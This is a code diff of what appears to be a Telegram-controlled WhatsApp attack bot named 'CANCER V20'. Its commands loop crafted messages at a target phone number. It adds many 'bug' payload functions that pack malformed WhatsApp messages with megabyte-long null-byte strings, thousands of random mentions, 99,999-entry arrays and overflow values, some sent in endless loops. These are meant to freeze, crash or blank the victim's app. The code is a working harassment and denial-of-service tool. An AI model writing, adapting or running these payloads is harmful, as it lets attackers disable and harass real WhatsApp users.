-            for (let i = 0; i < 250; i++) {
-                try { await VnXBlankQoutedNew(sock, target); } catch (e) {}
-                await sleep(1000);
+            for (let i = 0; i < 100; i++) {
+                try { await SuperDelayByMia(sock, target);
+                await SuperSlowDelayByMia(sock, jid); } catch (e) {}
+                await sleep(1500);
             }
             await ctx.telegram.editMessageCaption(ctx.chat.id, msg?.message_id, null,
                 `<blockquote><b>🏁 CANCER V20 — KUANTUM FINISHED</b></blockquote>\n\n` +
@@ -3101,7 +3167,7 @@ bot.command("kuantum", checkWhatsAppConnection, async (ctx) => {
                 `<b>└───────────────────────────</b>`,
                 {
                     parse_mode: "HTML",
-                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, style: btnStyler.get(), icon_custom_emoji_id: "5778212665167975922" }]] }
+                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, style: btnStylerPrivate.get(), icon_custom_emoji_id: "5778212665167975922" }]] }
                 }
             ).catch(() => {});
         });
@@ -3145,9 +3211,10 @@ bot.command("modols", checkWhatsAppConnection, async (ctx) => {
         }).catch(() => null);
 
         setImmediate(async () => {
-            for (let i = 0; i < 250; i++) {
-                try { await VnXDelayNewByRaffi(sock, target); } catch (e) {}
-                await sleep(100);
+            for (let i = 0; i < 100; i++) {
+                try { await BlankDocumentByMia(client, target);
+                await BlankMsg(sock, target) } catch (e) {}
+                await sleep(1500);
             }
             await ctx.telegram.editMessageCaption(ctx.chat.id, msg?.message_id, null,
                 `<blockquote><b>🏁 CANCER V20 — MODOLS FINISHED</b></blockquote>\n\n` +
@@ -3159,7 +3226,7 @@ bot.command("modols", checkWhatsAppConnection, async (ctx) => {
                 `<b>└───────────────────────────</b>`,
                 {
                     parse_mode: "HTML",
-                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, style: btnStyler.get(), icon_custom_emoji_id: "5778212665167975922" }]] }
+                    reply_markup: { inline_keyboard: [[{ text: "👤 View Target", url: `https://wa.me/${q}`, style: btnStylerPrivate.get(), icon_custom_emoji_id: "5778212665167975922" }]] }
                 }
             ).catch(() => {});
         });
@@ -3171,175 +3238,926 @@ bot.command("modols", checkWhatsAppConnection, async (ctx) => {
 });
 
 // ~ Function Bugs ~ \\
-async function VnXFcOrderNew(sock, target) {
-  await sock.relayMessage(target, {
+async function VnXNewForceImageTagSw(sock, target, mention = true) {
+  while (true) {
+    const vnxfcnih = generateWAMessageFromContent(
+      target, {
+        imageMessage: {
+          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c&mms3=true",
+          directPath: "/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c",
+          mimetype: 'image/jpeg',
+          caption: 'Cancer',
+          mediaKey: "gMU/MAFMpfewBPxf03l77UJ4BFniwIskJin1EAMj8e8=",
+          fileEncSha256: "qMxO75MnLoMaS/b/UuTRAtBNXh2H0HSVPVkJlkmSpgk=",
+          fileSha256: "RbwxheXko2h6rCjgkzKmD+l/wFliuC6SxtY3tbwSNzg=",
+          fileLength: '19897899',
+          mediaKeyTimestamp: "1778296099",
+          jpegThumbnail: Buffer.from(
+            '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=',
+            'base64',
+          ),
+          contextInfo: {
+            pairedMediaType: 'NOT_PAIRED_MEDIA',
+            isQuestion: true,
+            isGroupStatus: true,
+            mentionedJid: [
+              '0@s.whatsapp.net',
+              ...Array.from({
+                  length: 2000,
+                },
+                () =>
+                '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net',
+              ),
+            ],
+          },
+          scansSidecar: '3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==',
+          scanLengths: [
+            2899999999999999077, 1799999999999998555, 7699999999999999148,
+            1069999999999999164,
+          ],
+          midQualityFileSha256: 'Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk=',
+        },
+      }, {
+        userJid: target
+      },
+    );
+
+    try {
+      await sock.relayMessage('status@broadcast', vnxfcnih.message, {
+        additionalNodes: [{
+          tag: 'meta',
+          attrs: {},
+          content: [{
+            tag: 'mentioned_users',
+            attrs: {},
+            content: [{
+              tag: 'to',
+              attrs: {
+                jid: target
+              },
+              content: undefined
+            }],
+          }, ],
+        }, ],
+        statusJidList: [target],
+        messageId: vnxfcnih.key.id,
+      });
+
+      if (mention) {
+        await sock.relayMessage(
+          target, {
+            statusMentionMessage: {
+              message: {
+                protocolMessage: {
+                  key: vnxfcnih.key,
+                  type: 25
+                }
+              },
+            },
+          }, {},
+        );
+      }
+    } catch (error) {
+      console.log("Error relaying message:", error);
+    }
+
+    await sleep(1500);
+  }
+}
+
+// type Invis Bebas Spam
+async function VnXNewForceImageInvis(sock, target) {
+  while (true) {
+    const mbgvnxnew = {
+      groupStatusMessageV2: {
+        message: {
+          imageMessage: {
+          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c&mms3=true",
+          directPath: "/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c",
+          mimetype: 'image/jpeg',
+          caption: 'Cancer',
+          mediaKey: "gMU/MAFMpfewBPxf03l77UJ4BFniwIskJin1EAMj8e8=",
+          fileEncSha256: "qMxO75MnLoMaS/b/UuTRAtBNXh2H0HSVPVkJlkmSpgk=",
+          fileSha256: "RbwxheXko2h6rCjgkzKmD+l/wFliuC6SxtY3tbwSNzg=",
+          fileLength: '19897899',
+          mediaKeyTimestamp: "1778296099",
+          jpegThumbnail: Buffer.from(
+            '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=',
+            'base64',
+          ),
+          contextInfo: {
+            pairedMediaType: 'NOT_PAIRED_MEDIA',
+            isQuestion: true,
+            isGroupStatus: true,
+            mentionedJid: [
+              '0@s.whatsapp.net',
+              ...Array.from({
+                  length: 2000,
+                },
+                () =>
+                '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net',
+              ),
+            ],
+          },
+          scansSidecar: '3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==',
+          scanLengths: [
+            2899999999999999077, 1799999999999998555, 7699999999999999148,
+            1069999999999999164,
+          ],
+          midQualityFileSha256: 'Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk=',
+        },        
+        }
+      }
+    };
+
+    try {
+      await sock.relayMessage(target, mbgvnxnew, {
+        participant: { jid: target },
+      });
+    } catch (e) {
+      console.log("❌ Error di dalam loop:", e);
+    }
+  }
+}
+
+async function DelayNoDetectByMia(sock, target) {
+    await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: {
+      interactiveResponseMessage: {
+        body: {
+          text: "lagi ngapain?",
+          format: "DEFAULT"
+        },
+        nativeFlowResponseMessage: {
+          name: "call_permission_request",
+          paramsJson: "",
+          version: 3
+        },
+        contextInfo: {
+          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
+          isForwarded: true,
+          forwardingScore: 9999,
+          urlTrackingMap: {
+            urlTrackingMapElements: Array.from({ length: 99999 }, (_, n) => ({
+              participant: `62${n + 888888}@s.whatsapp.net`
+            }))
+          },
+        },
+      },
+    },
+  },
+}, { participant: { jid: target }});
+
+await sock.relayMessage(
+    target,
+    {
+  groupStatusMessageV2: { 
+    message: {
+      interactiveResponseMessage: {
+        body: {
+          text: "I Love Dric hehehe",
+          format: "DEFAULT",
+        },
+        nativeFlowResponseMessage: {
+          name: "address_message",
+          paramsJson: `{\"values\":{\"in_pin_code\":\"+9999999999\",\"building_name\":\"ampos\",\"address\":\"/MakLo\",\"tower_number\":\"987\",\"city\":\"MakLo\",\"name\":\"CRB\",\"phone_number\":\"+888888888888\",\"house_number\":\"99\",\"floor_number\":\"99\",\"state\":\"${"\u0000".repeat(5000)}\"}}`,
+          version: 3
+          },
+          contextInfo: {
+          remoteJid: Math.random().toString(36) + "\u0000".repeat(9000),
+          isForwarded: true,
+          forwardingScore: 9999,
+          statusAttributionType: 2,
+            statusAttributions: Array.from({ length: 99999 }, (_, n) => ({
+              participant: `62${n + 888888}@s.whatsapp.net`,
+              type: 1
+            })),
+        },
+      },
+    },
+  },
+}, { participant: { jid: target }});
+}
+
+async function FcDelayV1ByMia(client, target) {
+try {
+    const msgx = {
+        viewOnceMessage: {  
+            message: {  
+                interactiveResponseMessage: {  
+                    body: {  
+                        text: " already cancer in your number ",  
+                        hasMediaAttachment: false  
+                    },  
+                    imageMessage: {  
+                        url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",  
+                        mimetype: "image/jpeg",  
+                        fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",  
+                        fileLength: "11887",  
+                        height: 1080,  
+                        width: 1080,  
+                        mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",  
+                        fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",  
+                        directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",  
+                        mediaKeyTimestamp: "1750124469",  
+                        contextInfo: {  
+                            forwardingScore: 9999,  
+                            isForwarded: true,  
+                            mentionedJid: [  
+                                "0@s.whatsapp.net",  
+                                ...Array.from(  
+                                    { length: 1900 },  
+                                    () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"  
+                                )  
+                            ],  
+                            expiration: 9741,  
+                            ephemeralSettingTimestamp: 9741,  
+                            entryPointConversionSource: "WhatsApp.com",  
+                            entryPointConversionApp: "WhatsApp",  
+                            entryPointConversionDelaySeconds: 9742,  
+                            disappearingMode: {  
+                                initiator: "INITIATED_BY_OTHER",  
+                                trigger: "ACCOUNT_SETTING"  
+                            }  
+                        },  
+                        scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",  
+                        scanLengths: [2071, 6199, 1634, 1983],  
+                        midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="  
+                    },  
+                    nativeFlowResponseMessage: {  
+                        name: "address_message",  
+                        paramsJson: "\u0000".repeat(1045900),  
+                        version: 3  
+                    }  
+                }  
+            }  
+        }  
+    };
+
+    const hanzz = await generateWAMessageFromContent(target, msgx, {});
+
+    await client.relayMessage("status@broadcast", hanzz.message, {
+        messageId: hanzz.key.id,
+        statusJidList: [target],
+        additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+                tag: "mentioned_users",
+                attrs: {},
+                content: [{
+                    tag: "to",
+                    attrs: { jid: target },
+                    content: undefined
+                }]
+            }]
+        }]
+    });
+
+    const generateId = () => Math.random().toString(36).substring(2, 15);
+    const msg = {
+        key: { remoteJid: "status@broadcast", fromMe: false, id: generateId() },
+        message: {
+            imageMessage: {
+                url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
+                mimetype: "image/jpeg",
+                fileSha256: Buffer.from("qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=", "base64"),
+                caption: "Are You Look Dric?",
+                fileLength: "149502",
+                height: 1397,
+                width: 1126,
+                mediaKey: Buffer.from("5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=", "base64"),
+                fileEncSha256: Buffer.from("XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=", "base64"),
+                directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
+                mediaKeyTimestamp: "1777621571",
+                jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQ0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=", "base64"),
+                contextInfo: {
+                    pairedMediaType: "NOT_PAIRED_MEDIA",
+                    isQuestion: true,
+                    isGroupStatus: true
+                },
+                scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
+                scanLengths: [2899999999999999077, 1799999999999998555, 7699999999999999148, 1069999999999999164],
+                midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
+            }
+        },
+        messageTimestamp: Math.floor(Date.now() / 1000)
+    };
+
+    await client.relayMessage("status@broadcast", msg.message, {
+        statusJidList: [target],
+        messageId: msg.key.id,
+        additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+                tag: "mentioned_users",
+                attrs: {},
+                content: [{
+                    tag: "to",
+                    attrs: { jid: target },
+                    content: undefined
+                }]
+            }]
+        }]
+    });
+
+    await client.relayMessage(target, {
+        statusMentionMessage: {
+            message: {
+                protocolMessage: {
+                    key: msg.key,
+                    type: 25
+                },
+                additionalNodes: [{
+                    tag: "meta",
+                    attrs: { is_status_mention: "false" },
+                    content: undefined
+                }]
+            }
+        }
+    }, {});
+
+    await client.relayMessage(target, {
+        statusMentionMessage: {
+            message: {
+                protocolMessage: {
+                    key: msg.key,
+                    type: 25
+                }
+            }
+        }
+    }, {});
+    
+    console.log(`succes send to ${target}`);
+    
+    } catch(e) {
+        console.log(`error ${e.message}`);
+  }
+}
+
+async function DelayBlankInvisByMia(sock, target) {
+  await sock.relayMessage("status@broadcast", {
     viewOnceMessage: {
       message: {
-        orderMessage: {
-          orderId: "92828",
-          thumbnail: null,
-          itemCount: 9999999999999,
-          status: "INQUIRY",
-          surface: "CATALOG",
-          message: "DxC Order",
-          orderTitle: "DxC Rawrr",
-          token: "8282882828==",
-          totalAmount1000: "828828292727372728829",
-          currencyCode: 123,
-          amount: "CORRUPT", 
-          contextInfo: {
-            isForwarded: true,
-            forwardingScore: 999,
-            quotedMessage: {
-              stickerMessage: {
-                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
-                fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-                fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-                mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-                mimetype: "image/webp",
-                directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-                fileLength: "10610",
-                mediaKeyTimestamp: "1775044724",
-                stickerSentTs: "1775044724091"
+        interactiveMessage: {
+          nativeFlowMessage: {
+            buttons: [
+              {
+                name: "payment_info",
+                buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'ꦾ'.repeat(5000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"dric","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
               }
-            }
+            ]
           }
         }
       }
     }
-  }, { participant: { jid: target } });
-}
-
-async function VnXDelayXfrezeeNew(sock, target) {
- const sqlfake = Array.from({ length: 10000 }, (_, i) => 
-    `${i}@s.whatsapp.net`
-   );
- for (let i = 0; i < 250; i++) {
-    await sock.relayMessage("status@broadcast",
-    {
-      interactiveResponseMessage: {
-        contextInfo: {
-          mentionedJid: sqlfake,
-          urlTrackingMap: {
-            urlTrackingMapElements: Array.from({ length: 100000 }, () => ({}))
-          },
-          body: {
-            text: "{{".repeat(250000)
-          },
-          nativeFlowResponseMessage: {
-            name: "call_permission_request",
-            paramsJson: "{{".repeat(9999099),
-            version: 3
-          }
-        }
-      }
-    }, {
-        statusJidList: [target],
-        additionalNodes: [
+  }, {
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: { status_setting: "contacts" },
+        content: [
           {
-            tag: "meta",
-            attrs: { status_setting: "allowlist" },
+            tag: "mentioned_users",
+            attrs: {},
             content: [
               {
-                tag: "mentioned_users",
-                attrs: {},
-                content: [
-                  {
-                    tag: "to",
-                    attrs: { jid: target },
-                    content: []
-                  }
-                ]
+                tag: "to",
+                attrs: { jid: target },
+                content: []
               }
             ]
           }
         ]
       }
-    );
-  }
-  await sleep(5000);
+    ]
+  });
 }
 
-async function VnXDelayNewByRaffi(sock, target) {
- await sock.relayMessage(target, {
-   groupStatusMessageV2: {
-      message: {
-       interactiveResponseMessage: {
-         header: {
-           extendedTextMessage: {
-             name: "call_permission_request",
-             title: "\u0000.DxC" + "{{".repeat(250000)
+async function BlankSistemUiByMia(client, target) {
+  
+  let biji2 = await generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: " assalamu'alaikum, salam kenal ini cancer ",
+              format: "DEFAULT",
+            },
+            nativeFlowResponseMessage: {
+              name: "galaxy_message",
+              paramsJson: JSON.stringify({ error: "test" }),
+              version: 3,
+            },
+            entryPointConversionSource: "call_permission_request",
           },
-          body: {
-            text: "DxC"
-          },
-          nativeFlowResponseMessage: {
-            paramsJson: "\u0000".repeat(9999099),
-            version: 3
-          },
-           contextInfo: {
-             urlTrackingMap: {
-              urlTrackingMapElements: Array.from({ length: 100000 }, () => ({})),
-              }
-            }
-          }
-        }
-      }
+        },
+      },
+    },
+    {
+      ephemeralExpiration: 0,
+      forwardingScore: 9741,
+      isForwarded: true,
     }
-  }, { participant: { jid: target } });
+  );
+ 
+  const mediaData = [
+    {
+      ID: "68917910",
+      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
+      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
+      sid: "5e03e0",
+      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
+      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
+      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
+    },
+    {
+      ID: "68884987",
+      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
+      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
+      sid: "5e03e0",
+      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
+      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
+      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
+    },
+  ]
 
-  console.log("[!] DxC Bug Sent to: " + target);
-}
+  let sequentialIndex = 0
+  const selectedMedia = mediaData[sequentialIndex]
+  sequentialIndex = (sequentialIndex + 1) % mediaData.length
+  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia
 
-async function VnXFcCombo(sock, target) {
-  console.log(`Sedang mengirim Paket Hadiah ke ${target}`);
+  const massiveMentions = [
+    target,
+    ...Array.from({ length: 1000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
+  ]
 
-  const message = {
-    groupStatusMessageV2: {
+  const contextInfo = {
+    participant: target,
+    mentionedJid: massiveMentions,
+  }
+
+  const stickerMsg = {
+    viewOnceMessage: {
+      message: {
+        stickerMessage: {
+          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
+          fileSha256: SHA256,
+          fileEncSha256: ENCSHA256,
+          mediaKey: mkey,
+          mimetype: "image/webp",
+          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
+          fileLength: { low: Math.floor(Math.random() * 1000000000), high: 100, unsigned: true },
+          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
+          firstFrameLength: 19904,
+          firstFrameSidecar: "KN4kQ5pyABRAgA==",
+          isAnimated: true,
+          contextInfo,
+          isAvatar: false,
+          isAiSticker: false,
+          isLottie: false,
+        },
+      },
+    },
+  }
+
+  const msgxay = {
+    viewOnceMessage: {
       message: {
         interactiveResponseMessage: {
-          body: {
-            text: "DxC",
-            format: "DEFAULT"
-          },
+          body: { text: "Are You Look Dric?", format: "DEFAULT" },
           nativeFlowResponseMessage: {
-            name: "galaxy_message",
-            paramsJson: "\u0000".repeat(1045000),
-            version: 3
+            name: "call_permission_request",
+            paramsJson: JSON.stringify({ type: "test" }),
+            version: 3,
           },
-          entryPointConversionSource: "call_permission_request",
-          contextInfo: {
-            stanzaId: "DXC",
-            participant: target,
-            quotedMessage: {
-              stickerMessage: {
-                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
-                fileSha256: Buffer.from("SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=", "base64"),
-                fileEncSha256: Buffer.from("l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=", "base64"),
-                mediaKey: Buffer.from("UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=", "base64"),
-                mimetype: "image/webp",
-                directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-                fileLength: "10610",
-                mediaKeyTimestamp: "1775044724",
-                stickerSentTs: "1775044724091"
-              }
-            }
